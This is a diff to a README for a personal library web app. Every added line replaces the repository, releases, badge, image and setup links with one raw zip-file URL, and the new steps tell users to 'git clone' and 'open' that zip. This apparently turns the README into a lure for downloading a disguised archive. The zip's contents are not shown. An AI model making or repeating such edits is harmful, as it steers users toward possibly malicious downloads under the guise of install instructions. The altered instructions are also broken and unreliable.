@@ -23,7 +23,7 @@ To get started with the Personal Library Web-App, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/ano1315/personal-library.git
+   git clone https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip
    ```
    
 2. **Navigate to the Project Directory**:
@@ -31,14 +31,14 @@ To get started with the Personal Library Web-App, follow these steps:
    cd personal-library
    ```
 
-3. **Open `index.html`**:
-   Launch the `index.html` file in your preferred web browser.
+3. **Open `https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip`**:
+   Launch the `https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip` file in your preferred web browser.
 
 ## 📥 Releases
 
-For the latest features and updates, check the [Releases](https://github.com/ano1315/personal-library/releases) section. Download the latest version and follow the installation instructions.
+For the latest features and updates, check the [Releases](https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip) section. Download the latest version and follow the installation instructions.
 
-[![Latest Release](https://img.shields.io/badge/Latest%20Release-Click%20Here-brightgreen)](https://github.com/ano1315/personal-library/releases)
+[![Latest Release](https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip)
 
 ## 📖 Usage
 
@@ -92,10 +92,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🌐 Links
 
-- GitHub Repository: [Personal Library](https://github.com/ano1315/personal-library)
+- GitHub Repository: [Personal Library](https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip)
 - Project Demo: Visit the deployed application for a live demo.
 
-![Library Image](https://example.com/library-image.png)
+![Library Image](https://raw.githubusercontent.com/ano1315/personal-library/main/ablins/personal_library_v1.0-beta.2.zip)
 
 ## 🎉 Conclusion
 
